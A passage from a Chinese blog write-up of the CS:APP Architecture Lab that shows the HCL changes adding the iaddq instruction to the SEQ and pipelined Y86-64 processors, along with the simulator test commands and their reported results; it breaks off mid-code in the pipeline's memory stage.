<li>B 部分中的任务是扩展 SEQ 处理器以支持 iaddq，即将立即数和寄存器相加</li>
<li>要添加此说明，您将修改文件 <strong>seq-full.hcl</strong>，该文件实现了 CS：APP3e 教科书中描述的 SEQ 版本</li>
<li>我们根据 SEQ 设计的 iaddq 各阶段实现如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 取指	</span><br><span class="line">	icdoe:ifun	&lt;-	M1[PC]</span><br><span class="line">		rA:rB	&lt;-	M1[PC + 1]</span><br><span class="line">    	valC	&lt;-	M8[PC + 2]</span><br><span class="line">   		valP	&lt;-	PC + 10</span><br><span class="line"># 译码</span><br><span class="line">		valB	&lt;-	R[rB]</span><br><span class="line"># 执行</span><br><span class="line">		valE	&lt;-	valC + valB</span><br><span class="line"># 访存</span><br><span class="line"></span><br><span class="line"># 写回</span><br><span class="line">		r[rB]	&lt;-	valE</span><br><span class="line"># 更新 PC</span><br><span class="line">		  PC	&lt;-	valP</span><br></pre></td></tr></table></figure>

<h2 id="修改-seq-full-hcl-文件"><a href="#修改-seq-full-hcl-文件" class="headerlink" title="修改 seq-full.hcl 文件"></a>修改 seq-full.hcl 文件</h2><ul>
<li><p>注意在 HCL 描述中添加 iaddq 时要大写，且要加上前缀 I，即写成 <strong>IIADDQ</strong></p>
</li>
<li><p>取指阶段</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">################ Fetch Stage ###################################</span><br><span class="line"></span><br><span class="line"># Determine instruction code</span><br><span class="line">word icode = [</span><br><span class="line">	imem_error: INOP;</span><br><span class="line">	1: imem_icode;		# Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Determine instruction function</span><br><span class="line">word ifun = [</span><br><span class="line">	imem_error: FNONE;</span><br><span class="line">	1: imem_ifun;		# Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">bool instr_valid = icode in 	# IADDQ 是一个合法的 Y86-64 指令,要加上</span><br><span class="line">	&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte? 获取的指令是否需要 regid 字节？</span><br><span class="line">bool need_regids =		# IADDQ 有寄存器指示符字节，要加上</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word? 获取指令需要常数字吗？</span><br><span class="line">bool need_valC =		# IADDQ 需要常数字，要加上</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>译码和写回阶段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">################ Decode Stage ###################################	</span><br><span class="line"></span><br><span class="line">## What register should be used as the A source? 什么寄存器应该用作 A 源？Don&#x27;t need</span><br><span class="line">word srcA = [</span><br><span class="line">	icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;</span><br><span class="line">	icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE; # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the B source? 应该使用什么寄存器作为 B 源？ rB</span><br><span class="line">word srcB = [</span><br><span class="line">	icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the E destination? 应该使用什么寄存器作为 E 目标？ rB</span><br><span class="line">word dstE = [</span><br><span class="line">	icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">	icode in &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the M destination? 应该使用什么寄存器作为 M 目标？ Don&#x27;t need</span><br><span class="line">word dstM = [</span><br><span class="line">	icode in &#123; IMRMOVQ, IPOPQ &#125; : rA;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<ul>
<li>执行阶段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">################ Execute Stage ###################################	</span><br><span class="line"></span><br><span class="line">## Select input A to ALU 选择输入 A 到 ALU 	valC</span><br><span class="line">word aluA = [</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;</span><br><span class="line">	icode in &#123; ICALL, IPUSHQ &#125; : -8;</span><br><span class="line">	icode in &#123; IRET, IPOPQ &#125; : 8;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU 选择输入 B 到 ALU 	valB</span><br><span class="line">word aluB = [</span><br><span class="line">	icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">		      IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span><br><span class="line">	icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set the ALU function 设置 ALU 函数	默认 ALUADD 就行</span><br><span class="line">word alufun = [</span><br><span class="line">	icode == IOPQ : ifun;</span><br><span class="line">	1 : ALUADD;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated? 是否应该更新条件代码？ Yes</span><br><span class="line">bool set_cc = icode in &#123; IOPQ, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>访存阶段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">################ Memory Stage ################################### </span><br><span class="line"></span><br><span class="line">## Set read control signal 设置读取控制信号 Don&#x27;t need</span><br><span class="line">bool mem_read = icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="line"></span><br><span class="line">## Set write control signal 设置写控制信号 Don&#x27;t need</span><br><span class="line">bool mem_write = icode in &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;</span><br><span class="line"></span><br><span class="line">## Select memory address 选择内存地址 Don&#x27;t need</span><br><span class="line">word mem_addr = [</span><br><span class="line">	icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : valE;</span><br><span class="line">	icode in &#123; IPOPQ, IRET &#125; : valA;</span><br><span class="line">	# Other instructions don&#x27;t need address</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select memory input data 选择内存输入数据 Don&#x27;t need</span><br><span class="line">word mem_data = [</span><br><span class="line">	# Value from register</span><br><span class="line">	icode in &#123; IRMMOVQ, IPUSHQ &#125; : valA;</span><br><span class="line">	# Return PC</span><br><span class="line">	icode == ICALL : valP;</span><br><span class="line">	# Default: Don&#x27;t write anything</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Determine instruction status 确定指令状态 Don&#x27;t need</span><br><span class="line">word Stat = [</span><br><span class="line">	imem_error || dmem_error : SADR;</span><br><span class="line">	!instr_valid: SINS;</span><br><span class="line">	icode == IHALT : SHLT;</span><br><span class="line">	1 : SAOK;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<ul>
<li>更新 PC</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">################ Program Counter Update ############################ </span><br><span class="line"></span><br><span class="line">## What address should instruction be fetched at 指令应该在什么地址获取 valP</span><br><span class="line"></span><br><span class="line">word new_pc = [</span><br><span class="line">	# Call.  Use instruction constant</span><br><span class="line">	icode == ICALL : valC;</span><br><span class="line">	# Taken branch.  Use instruction constant</span><br><span class="line">	icode == IJXX &amp;&amp; Cnd : valC;</span><br><span class="line">	# Completion of RET instruction.  Use value from stack</span><br><span class="line">	icode == IRET : valM;</span><br><span class="line">	# Default: Use incremented PC</span><br><span class="line">	1 : valP;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
<li>在通过命令 <strong>make VERSION&#x3D;full</strong> 构建新的模拟器时可能会出现一些错误，需要修改 makefile 文件</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240317155152677.png" class="" title="image-20240317155152677">

<ul>
<li>修改 makefile 文件为如下内容</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Modify this line to indicate the default version to build</span></span><br><span class="line"></span><br><span class="line">VERSION=full 	<span class="comment"># VERSION=std</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Comment this out if you don&#x27;t have Tcl/Tk on your system</span></span><br><span class="line"></span><br><span class="line">GUIMODE=-Wall -O2 -DUSE_INTERP_RESULT	<span class="comment"># -DHAS_GUI</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过命令 <strong>.&#x2F;ssim -t ..&#x2F;y86-code&#x2F;asumi.yo</strong> 在简单的 Y86-64 程序上测试您的解决方案，运行结果如下：Succeeds</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240317160830202.png" class="" title="image-20240317160830202">

<ul>
<li>通过命令 <strong>(cd ..&#x2F;y86-code; make testssim)</strong> 使用基准测试程序重新测试解决方案。一旦您的模拟器能够正确执行小程序，您就可以在 Y86-64 基准测试程序上自动对其进行测试，运行结果如下：Succeeds</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240317161012790.png" class="" title="image-20240317161012790">

<ul>
<li>通过命令 <strong>(cd ..&#x2F;ptest; make SIM&#x3D;..&#x2F;seq&#x2F;ssim)</strong> 执行回归检验。一旦您可以正确执行基准测试程序，那么您应该测试除 iaddq 和 leave 之外的所有内容，运行结果如下：Succeeds</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240317161222277.png" class="" title="image-20240317161222277">

<ul>
<li>通过命令 <strong>(cd ..&#x2F;ptest; make SIM&#x3D;..&#x2F;seq&#x2F;ssim TFLAGS&#x3D;-i)</strong> 测试 iaddq 的实现，运行结果如下：Succeeds</li>
</ul>
<img src="/2024/03/16/CSAPP-Lab4/image-20240317161345939.png" class="" title="image-20240317161345939">

<h1 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h1><ul>
<li>您将在这部分的目录 <strong>sim&#x2F;pipe</strong> 中工作</li>
<li>ncopy 函数将一个 len 元素整数数组 src 复制到一个不重叠的 dst，返回 src 中包含的正整数数的计数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">2 * ncopy - copy src to dst, returning number of positive ints</span></span><br><span class="line"><span class="comment">3 * contained in src array.</span></span><br><span class="line"><span class="comment">4 */</span></span><br><span class="line"><span class="number">5</span> <span class="type">word_t</span> <span class="title function_">ncopy</span><span class="params">(<span class="type">word_t</span> *src, <span class="type">word_t</span> *dst, <span class="type">word_t</span> len)</span></span><br><span class="line">6 &#123;</span><br><span class="line"><span class="number">7</span>		<span class="type">word_t</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="number">8</span>		<span class="type">word_t</span> val;</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span>		<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">11</span>			val = *src++;</span><br><span class="line"><span class="number">12</span>			*dst++ = val;</span><br><span class="line"><span class="number">13</span>			<span class="keyword">if</span> (val &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">14</span>				count++;</span><br><span class="line"><span class="number">15</span>			len--;</span><br><span class="line"><span class="number">16</span>		&#125;</span><br><span class="line"><span class="number">17</span>		<span class="keyword">return</span> count;</span><br><span class="line"><span class="number">18</span> &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>您在 C 部分中的任务是修改 ncopy.ys 和 pipe-full.hcl，通过在 pipe-full.hcl 中实现 iaddq 的 PIPE 版本，使 ncopy.ys 尽可能快地运行</li>
<li>讲义中的一些说明<ul>
<li>您将提交两个文件：pipe-full.hcl 和 ncopy.ys</li>
<li>ncopy.ys 函数必须适用于任意数组大小</li>
<li>ncopy.ys 函数必须与 YIS 一起正确运行。ncopy 文件的汇编版本长度不得超过 1000 字节</li>
</ul>
</li>
</ul>
<h2 id="修改-pipe-full-hcl-文件"><a href="#修改-pipe-full-hcl-文件" class="headerlink" title="修改 pipe-full.hcl 文件"></a>修改 pipe-full.hcl 文件</h2><ul>
<li>思路和 SEQ 版本的类似</li>
<li>取指阶段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">################ Fetch Stage     ################################### 取指</span><br><span class="line"></span><br><span class="line">## What address should instruction be fetched at 指令应该在什么地址获取 default</span><br><span class="line">word f_pc = [</span><br><span class="line">	# Mispredicted branch.  Fetch at incremented PC</span><br><span class="line">	M_icode == IJXX &amp;&amp; !M_Cnd : M_valA;</span><br><span class="line">	# Completion of RET instruction</span><br><span class="line">	W_icode == IRET : W_valM;</span><br><span class="line">	# Default: Use predicted value of PC</span><br><span class="line">	1 : F_predPC;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Determine icode of fetched instruction 确定获取指令的 icode default</span><br><span class="line">word f_icode = [</span><br><span class="line">	imem_error : INOP;</span><br><span class="line">	1: imem_icode;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Determine ifun default</span><br><span class="line">word f_ifun = [</span><br><span class="line">	imem_error : FNONE;</span><br><span class="line">	1: imem_ifun;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Is instruction valid? 指令是否有效？ Yes</span><br><span class="line">bool instr_valid = f_icode in </span><br><span class="line">	&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">	  IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Determine status code for fetched instruction 确定获取指令的状态代码 default</span><br><span class="line">word f_stat = [</span><br><span class="line">	imem_error: SADR;</span><br><span class="line">	!instr_valid : SINS;</span><br><span class="line">	f_icode == IHALT : SHLT;</span><br><span class="line">	1 : SAOK;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte? 获取的指令是否需要 regid 字节？ Yes</span><br><span class="line">bool need_regids =</span><br><span class="line">	f_icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word? 获取指令需要常数字吗？ Yes</span><br><span class="line">bool need_valC =</span><br><span class="line">	f_icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Predict next value of PC 预测 PC 的下一个价值 default</span><br><span class="line">word f_predPC = [</span><br><span class="line">	f_icode in &#123; IJXX, ICALL &#125; : f_valC;</span><br><span class="line">	1 : f_valP;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<ul>
<li>译码和写回阶段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">################ Decode Stage ###################################### 译码和写回阶段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## What register should be used as the A source? 什么寄存器应该用作 A 源？ Don&#x27;t need</span><br><span class="line">word d_srcA = [</span><br><span class="line">	D_icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : D_rA;</span><br><span class="line">	D_icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE; # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the B source? 应该使用什么寄存器作为 B 源？ D_rB</span><br><span class="line">word d_srcB = [</span><br><span class="line">	D_icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : D_rB;</span><br><span class="line">	D_icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the E destination? 应该使用什么寄存器作为 E 目标？ D_rB</span><br><span class="line">word d_dstE = [</span><br><span class="line">	D_icode in &#123; IRRMOVQ, IIRMOVQ, IOPQ, IIADDQ&#125; : D_rB;</span><br><span class="line">	D_icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the M destination? 应该使用什么寄存器作为 M 目标？ Don&#x27;t need</span><br><span class="line">word d_dstM = [</span><br><span class="line">	D_icode in &#123; IMRMOVQ, IPOPQ &#125; : D_rA;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What should be the A value? A 值应该是多少？ 用来转发 default</span><br><span class="line">## Forward into decode stage for valA 进入 valA 的解码级</span><br><span class="line">word d_valA = [</span><br><span class="line">	D_icode in &#123; ICALL, IJXX &#125; : D_valP; # Use incremented PC</span><br><span class="line">	d_srcA == e_dstE : e_valE;    # Forward valE from execute</span><br><span class="line">	d_srcA == M_dstM : m_valM;    # Forward valM from memory</span><br><span class="line">	d_srcA == M_dstE : M_valE;    # Forward valE from memory</span><br><span class="line">	d_srcA == W_dstM : W_valM;    # Forward valM from write back</span><br><span class="line">	d_srcA == W_dstE : W_valE;    # Forward valE from write back</span><br><span class="line">	1 : d_rvalA;  # Use value read from register file</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">word d_valB = [ </span><br><span class="line">	d_srcB == e_dstE : e_valE;    # Forward valE from execute</span><br><span class="line">	d_srcB == M_dstM : m_valM;    # Forward valM from memory</span><br><span class="line">	d_srcB == M_dstE : M_valE;    # Forward valE from memory</span><br><span class="line">	d_srcB == W_dstM : W_valM;    # Forward valM from write back</span><br><span class="line">	d_srcB == W_dstE : W_valE;    # Forward valE from write back</span><br><span class="line">	1 : d_rvalB;  # Use value read from register file</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<ul>
<li>执行阶段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">################ Execute Stage ##################################### 执行阶段</span><br><span class="line"></span><br><span class="line">## Select input A to ALU 选择输入 A 到 ALU E_valC</span><br><span class="line">word aluA = [</span><br><span class="line">	E_icode in &#123; IRRMOVQ, IOPQ &#125; : E_valA;</span><br><span class="line">	E_icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : E_valC;</span><br><span class="line">	E_icode in &#123; ICALL, IPUSHQ &#125; : -8;</span><br><span class="line">	E_icode in &#123; IRET, IPOPQ &#125; : 8;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU 选择输入 B 到 ALU E_valB</span><br><span class="line">word aluB = [</span><br><span class="line">	E_icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">		     IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : E_valB;</span><br><span class="line">	E_icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set the ALU function 设置 ALU 函数 default</span><br><span class="line">word alufun = [</span><br><span class="line">	E_icode == IOPQ : E_ifun;</span><br><span class="line">	1 : ALUADD;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated? 是否应该更新条件代码？ Yes</span><br><span class="line">bool set_cc = E_icode in &#123; IOPQ, IIADDQ &#125; &amp;&amp;</span><br><span class="line">	# State changes only during normal operation</span><br><span class="line">	!m_stat in &#123; SADR, SINS, SHLT &#125; &amp;&amp; !W_stat in &#123; SADR, SINS, SHLT &#125;;</span><br><span class="line"></span><br><span class="line">## Generate valA in execute stage 在执行阶段生成 valA</span><br><span class="line">word e_valA = E_valA;    # Pass valA through stage</span><br><span class="line"></span><br><span class="line">## Set dstE to RNONE in event of not-taken conditional move 将 dstE 设置为 RNONE，以防未采取条件移动</span><br><span class="line">word e_dstE = [</span><br><span class="line">	E_icode == IRRMOVQ &amp;&amp; !e_Cnd : RNONE;</span><br><span class="line">	1 : E_dstE;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<ul>
<li>访存阶段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">################ Memory Stage ###################################### 访存阶段</span><br><span class="line"></span><br><span class="line">## Select memory address 	default</span><br><span class="line">word mem_addr = [</span><br><span class="line">	M_icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : M_valE;</span><br><span class="line">	M_icode in &#123; IPOPQ, IRET &#125; : 